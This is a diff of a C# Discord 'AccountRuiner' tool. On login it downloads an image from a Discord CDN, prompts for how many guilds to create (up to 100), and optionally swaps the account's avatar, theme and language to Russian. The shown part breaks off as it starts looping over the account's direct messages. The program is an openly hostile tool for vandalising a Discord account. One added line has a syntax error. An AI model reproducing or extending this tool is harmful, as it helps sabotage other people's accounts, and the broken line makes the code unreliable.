@@ -39,14 +39,27 @@ namespace AccountRuiner
 
         private static void Client_OnLoggedIn(DiscordSocketClient client, LoginEventArgs args)
         {
+            
+            using (WebClient wc = new WebClient())
+            {
+                wc.DownloadFile("https://cdn.discordapp.com/attachments/624408319372820500/627529053884383240/Anarchy.png", "lol.png");
+            }
             Console.WriteLine("How Many Guilds? (Max is 100)");
             int guilds = int.Parse(Console.ReadLine());
             Console.Clear();
+               Console.WriteLine("Do u want to Change Language,Pfp and theme Say Yes or No");
+            string type = Console.ReadLine();
+            if (type == ("yes"))
+            {
+                 Console.Clear();
+                client.User.ChangeProfile(new UserProfile() { Avatar = Image.FromFile("lol.png") }); //this function is for updating profile related settings
+                client.User.ChangeSettings(new UserSettings() { Theme = Theme.Light });
+                client.User.ChangeSettings(new UserSettings() { Language = Language.Russian };
+            }
             Console.WriteLine("Press Enter When Ready");
             Console.ReadLine();
-            Console.Clear();
- client.User.ChangeSettings(new UserSettings() { Theme = Theme.Light });
-client.User.ChangeSettings(new UserSettings() { Language = Language.Deutsch });
+ 
+         
             foreach (var dm in client.GetPrivateChannels())
             {
                 try
